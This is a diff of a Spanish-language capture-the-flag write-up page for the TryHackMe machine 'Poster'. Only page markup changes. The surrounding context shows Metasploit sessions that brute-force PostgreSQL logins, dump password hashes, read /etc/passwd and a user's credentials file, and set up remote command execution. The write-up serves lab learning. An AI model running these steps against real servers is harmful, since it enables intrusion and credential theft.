@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
+<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Poster es una maquina de TryHackMe, esta enfocada en PostgreSQL medio por el cual se obtuvieron credenciales para acceder por SSH. Credenciales almacenadas nos dieron acceso al siguiente usuario. Escalamos privilegios utilizando Sudo.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.92.2" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1603,10 +1603,10 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/metasploit/" class="single__tag" title="metasploit">metasploit</a></li>
+  <li><a href="https://sckull.github.io/tags/postgresql/" class="single__tag" title="postgresql">postgresql</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/postgresql/" class="single__tag" title="postgresql">postgresql</a></li>
+  <li><a href="https://sckull.github.io/tags/metasploit/" class="single__tag" title="metasploit">metasploit</a></li>
   
 
 </ul>
@@ -1657,7 +1657,7 @@
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto postgresql (5432) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1686,7 +1686,7 @@
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Fri Sep 11 23:46:50 2020 as: nmap -Pn -p- --min-rate=1000 -o allports poster.thm</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Fri Sep 11 23:46:50 2020 as: nmap -Pn -p- --min-rate=1000 -o allports poster.thm</span>
 Warning: 10.10.111.10 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span>.
 Nmap scan report <span class="k">for</span> poster.thm <span class="o">(</span>10.10.111.10<span class="o">)</span>
 Host is up <span class="o">(</span>0.26s latency<span class="o">)</span>.
@@ -1718,18 +1718,18 @@ Service detection performed. Please report any incorrect results at https://nmap
 </div><h1 id="http">HTTP</h1>
 <p>Encontramos una pagina web en el puerto 80.<br />
 <img src="/images/posts/thm/poster/Screenshot_20200911_234408.png" alt="image" /></p>
-<h2 id="gobuster-">GOBUSTER</h2>
+<h2 id="gobuster">GOBUSTER</h2>
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/poster$ gobuster dir -u http://poster.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/poster$ gobuster dir -u http://poster.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
 /assets <span class="o">(</span>Status: 301<span class="o">)</span>
 /images <span class="o">(</span>Status: 301<span class="o">)</span>
 /index.html <span class="o">(</span>Status: 200<span class="o">)</span>
@@ -1740,7 +1740,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Utilizando un modulo de metasploit para la enumeracion de usuarios por default logramos encontrar unas credenciales. Hay que mencionar que el nombre de las bases de datos que postgres crea durante la instalacion son: <code>postgres</code> y <code>template1</code>, por lo que es posible utilizar uno de estos dos para realizar una enumeracion de credenciales.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1806,7 +1806,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">64
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">msf5 &gt; search type:auxiliary postgres
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf5 &gt; search type:auxiliary postgres
 
 Matching <span class="nv">Modules</span>
 <span class="o">================</span>
@@ -1875,7 +1875,7 @@ msf5 auxiliary<span class="o">(</span>scanner/postgres/postgres_login<span class
 </div><p>Con las credenciales encontradas podemos verificar que el usuario actual pueda realizar Querys en la base de datos <code>template1</code>. El query que trae por defecto el modulo es para verificar la version de postgres.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1924,7 +1924,7 @@ msf5 auxiliary<span class="o">(</span>scanner/postgres/postgres_login<span class
 </span><span class="lnt">47
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">msf5 &gt; use auxiliary/admin/postgres/postgres_sql
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf5 &gt; use auxiliary/admin/postgres/postgres_sql
 msf5 auxiliary<span class="o">(</span>admin/postgres/postgres_sql<span class="o">)</span> &gt; show options 
 
 Module options <span class="o">(</span>auxiliary/admin/postgres/postgres_sql<span class="o">)</span>:
@@ -1976,7 +1976,7 @@ msf5 auxiliary<span class="o">(</span>admin/postgres/postgres_sql<span class="o"
 </div><p>Ahora que sabemos que podemos realizar querys en la base de datos, vamos a probar si es posible obtener los hashes de los usuarios con un modulo de metasploit.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2027,7 +2027,7 @@ msf5 auxiliary<span class="o">(</span>admin/postgres/postgres_sql<span class="o"
 </span><span class="lnt">49
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">msf5 auxiliary<span class="o">(</span>admin/postgres/postgres_sql<span class="o">)</span> &gt; use auxiliary/scanner/postgres/postgres_hashdump
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf5 auxiliary<span class="o">(</span>admin/postgres/postgres_sql<span class="o">)</span> &gt; use auxiliary/scanner/postgres/postgres_hashdump
 msf5 auxiliary<span class="o">(</span>scanner/postgres/postgres_hashdump<span class="o">)</span> &gt; show options 
 
 Module options <span class="o">(</span>auxiliary/scanner/postgres/postgres_hashdump<span class="o">)</span>:
@@ -2081,7 +2081,7 @@ msf5 auxiliary<span class="o">(</span>scanner/postgres/postgres_hashdump<span cl
 </div><p>Tambien es posible realizar una lectura de archivos dentro del servidor utilizando otro modulo de metasploit. Al realizar la lectura del archivo <code>/etc/passwd</code> vemos la lista de usuarios dentro del servidor, además de eso tambien vemos una direccion de un archivo de texto.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2160,7 +2160,7 @@ msf5 auxiliary<span class="o">(</span>scanner/postgres/postgres_hashdump<span cl
 </span><span class="lnt">77
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">msf5 auxiliary<span class="o">(</span>scanner/postgres/postgres_hashdump<span class="o">)</span> &gt; use auxiliary/admin/postgres/postgres_readfile
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf5 auxiliary<span class="o">(</span>scanner/postgres/postgres_hashdump<span class="o">)</span> &gt; use auxiliary/admin/postgres/postgres_readfile
 msf5 auxiliary<span class="o">(</span>admin/postgres/postgres_readfile<span class="o">)</span> &gt; show options 
 
 Module options <span class="o">(</span>auxiliary/admin/postgres/postgres_readfile<span class="o">)</span>:
@@ -2242,7 +2242,7 @@ msf5 auxiliary<span class="o">(</span>admin/postgres/postgres_readfile<span clas
 </div><p>Realizamos la lectura de este archivo sospechoso y vemos que son &ldquo;credenciales&rdquo; de uno de los usuarios del servidor.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2262,7 +2262,7 @@ msf5 auxiliary<span class="o">(</span>admin/postgres/postgres_readfile<span clas
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">msf5 auxiliary<span class="o">(</span>admin/postgres/postgres_readfile<span class="o">)</span> &gt; <span class="nb">set</span> RFILE /home/dark/credentials.txt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf5 auxiliary<span class="o">(</span>admin/postgres/postgres_readfile<span class="o">)</span> &gt; <span class="nb">set</span> RFILE /home/dark/credentials.txt
 <span class="nv">RFILE</span> <span class="o">=</span>&gt; /home/dark/credentials.txt
 msf5 auxiliary<span class="o">(</span>admin/postgres/postgres_readfile<span class="o">)</span> &gt; run
 <span class="o">[</span>*<span class="o">]</span> Running module against 10.10.111.10
@@ -2285,7 +2285,7 @@ msf5 auxiliary<span class="o">(</span>admin/postgres/postgres_readfile<span clas
 </div><p>Tambien existe un modulo con el cual podemos realizar una ejecucion de comandos utilizando las credenciales de un usuario de postgres.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2343,7 +2343,7 @@ msf5 auxiliary<span class="o">(</span>admin/postgres/postgres_readfile<span clas
 </span><span class="lnt">56
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">msf5 exploit<span class="o">(</span>multi/postgres/postgres_copy_from_program_cmd_exec<span class="o">)</span> &gt;  
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf5 exploit<span class="o">(</span>multi/postgres/postgres_copy_from_program_cmd_exec<span class="o">)</span> &gt;  
 msf5 exploit<span class="o">(</span>multi/postgres/postgres_copy_from_program_cmd_exec<span class="o">)</span> &gt; <span class="nb">set</span> PASSWORD <span class="o">[</span>... REDACTED ...<span class="o">]</span>
 <span class="nv">PASSWORD</span> <span class="o">=</span>&gt; <span class="o">[</span>... REDACTED ...<span class="o">]</span>
 msf5 exploit<span class="o">(</span>multi/postgres/postgres_copy_from_program_cmd_exec<span class="o">)</span> &gt; <span class="nb">set</span> rhosts poster.thm
@@ -2701,7 +2701,7 @@ postgres
 </div>
 
 
-<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
+<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3818,7 +3818,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#nmap">NMAP</a></li>
     <li><a href="#http">HTTP</a>
       <ul>
-        <li><a href="#gobuster-">GOBUSTER</a></li>
+        <li><a href="#gobuster">GOBUSTER</a></li>
       </ul>
     </li>
     <li><a href="#postgresql---metasploit">POSTGRESQL - METASPLOIT</a></li>
